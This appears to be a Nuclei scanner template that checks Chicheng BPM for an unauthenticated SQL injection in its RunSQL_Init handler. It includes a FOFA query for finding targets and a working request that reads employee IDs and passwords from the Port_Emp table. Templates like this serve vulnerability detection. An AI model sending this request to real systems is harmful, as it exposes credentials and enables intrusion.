http:
    - matchers:
        - condition: or
          part: body
          type: word
          words:
            - '"No"'
            - '"NO"'
            - '"Pass"'
            - '"PASS"'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
          Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d

          ------123128312312389898yd98ays98d
          Content-Disposition: form-data; name="SQL"

          SELECT No,Pass FROM Port_Emp
          ------123128312312389898yd98ays98d--
id: chichengBPM-RunSQL_Init-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-1564380241" || body="正在登录流程&表单引擎设计器,请稍候"
        驰骋BPM RunSQL_Init 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 驰骋BPM RunSQL_Init SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486274&idx=1&sn=637dbf1b180de408ffad82996d459ebc&chksm=c267be71f5103767984d0b0e341e32b0016a6364ea04cb91febb4147d55f257ccd5873a26a38&token=1742030890&lang=zh_CN#rd
    severity: high
    tags:
        - 驰骋BPM
